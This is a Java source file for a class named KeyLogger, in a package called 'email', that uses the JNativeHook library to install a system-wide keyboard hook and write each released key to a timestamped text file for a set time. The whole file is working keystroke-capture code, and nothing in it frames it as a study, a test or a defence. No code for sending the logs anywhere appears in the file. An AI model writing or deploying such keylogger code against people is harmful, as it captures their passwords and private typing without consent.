package email;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.io.FileWriter;
import java.io.IOException;
import java.time.ZonedDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Scanner;

public class KeyLogger {
    private static KeyLogger instance = new KeyLogger();
    private boolean stopLogging = false;

    private KeyLogger() {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            System.out.println("Some error with hook");
        }
    }

    public static KeyLogger getInstance() {
        return instance;
    }

    public String startLog(long time) throws IOException {
        String filename = "KEY LOG" + ZonedDateTime.now().format(DateTimeFormatter
                .ofPattern(" dd-MM-yyyy HH-mm")) + ".txt";
        FileWriter writer = new FileWriter(filename,false);
        NativeKeyListener listener = new NativeKeyListener() {
            @Override
            public void nativeKeyReleased(NativeKeyEvent nativeEvent) {
                try {
                    writer.write(NativeKeyEvent.getKeyText(nativeEvent.getKeyCode()));
                    writer.write(" ");
                    writer.flush();
                } catch (IOException e) {
                    System.out.println("Error when logging");
                    e.printStackTrace();
                }
            }
        };
        long t1 = System.currentTimeMillis();
        GlobalScreen.addNativeKeyListener(listener);
        Thread thread = new Thread(() -> {
            while (true) {
                try {
                    Thread.sleep(100);
                    if (System.currentTimeMillis() - t1 > time) {
                        GlobalScreen.removeNativeKeyListener(listener);
                        break;
                    }
                } catch (InterruptedException e) {
                    System.out.println("Error when stopping");
                    e.printStackTrace();
                }
            }
        });
        thread.start();
        try {
            thread.join();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        finally {
            writer.close();
        }
        return filename;
    }

    public static void main(String[] args) {
        System.out.println("Start log...");
        try {
            KeyLogger.getInstance().startLog(3000);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        System.out.println("End");
    }
}